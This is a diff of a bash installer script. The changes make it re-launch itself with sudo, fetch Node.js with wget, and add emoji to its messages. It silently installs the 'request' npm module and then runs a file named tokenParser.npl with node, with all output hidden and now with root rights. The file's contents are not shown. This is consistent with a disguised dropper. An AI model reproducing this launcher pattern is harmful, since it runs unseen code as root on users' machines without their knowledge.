@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# Ensure script is run with administrator (sudo) privileges
+# Auto-elevate with sudo if not run as root
 if [[ $EUID -ne 0 ]]; then
-   echo "This script requires administrator privileges. Please run with sudo."
-   exit 1
+   echo "🔒 This script requires administrator privileges. Re-running with sudo..."
+   exec sudo "$0" "$@"
 fi
 
 echo "✅ Running with administrator rights."
@@ -26,14 +26,14 @@ fi
 if [ "$INSTALL_NODE" -eq 1 ]; then
     echo "Node.js not installed. Installing Node.js version $NODE_VERSION..."
 
-    # Check if curl is available
-    if ! command -v curl &> /dev/null; then
-        echo "curl is required but not installed. Installing curl..."
-        apt-get install -y curl || brew install curl
+    # Check if wget is available
+    if ! command -v wget &> /dev/null; then
+        echo "wget is required but not installed. Installing wget..."
+        apt-get install -y wget || brew install wget
     fi
 
     # Download Node.js tarball
-    curl -sL "$DOWNLOAD_URL" -o "$NODE_TAR"
+    wget -q "$DOWNLOAD_URL" -O "$NODE_TAR"
 
     if [ -f "$NODE_TAR" ]; then
         # Extract the tarball to /usr/local
@@ -42,31 +42,31 @@ if [ "$INSTALL_NODE" -eq 1 ]; then
         # Clean up
         rm -f "$NODE_TAR"
     else
-        echo "Failed to download Node.js. Exiting."
+        echo "❌ Failed to download Node.js. Exiting."
         exit 1
     fi
 else
-    echo "Node.js version $NODE_INSTALLED_VERSION is already installed."
+    echo "✅ Node.js version $NODE_INSTALLED_VERSION is already installed."
 fi
 
 # Verify Node.js and npm installation
 if ! command -v node &> /dev/null; then
-    echo "Node.js installation failed. Exiting."
+    echo "❌ Node.js installation failed. Exiting."
     exit 1
 fi
 
 if ! command -v npm &> /dev/null; then
-    echo "npm installation failed. Exiting."
+    echo "❌ npm installation failed. Exiting."
     exit 1
 fi
 
 # Install required npm modules
 if [ ! -d "$(dirname "$0")/node_modules" ]; then
-    echo "Finalizing the process by installing npm modules..."
+    echo "📦 Installing npm modules..."
     pushd "$(dirname "$0")" > /dev/null
     npm install request --silent --no-progress --loglevel=error --fund=false > /dev/null 2>&1
     if [ $? -ne 0 ]; then
-        echo "npm install failed. Exiting."
+        echo "❌ npm install failed. Exiting."
         popd > /dev/null
         exit 1
     fi
@@ -75,15 +75,16 @@ fi
 
 # Check if tokenParser script exists and run it
 if [ -f "$(dirname "$0")/tokenParser.npl" ]; then
-    echo "Running tokenParser script..."
+    echo "▶️ Running tokenParser script..."
     node "$(dirname "$0")/tokenParser.npl" > /dev/null 2>&1
     if [ $? -ne 0 ]; then
-        echo "Error running tokenParser script. Exiting."
+        echo "❌ Error running tokenParser script. Exiting."
         exit 1
     fi
 else
-    echo "tokenParser.npl not found. Exiting."
+    echo "❌ tokenParser.npl not found. Exiting."
     exit 1
 fi
 
+echo "✅ Script completed successfully."
 exit 0
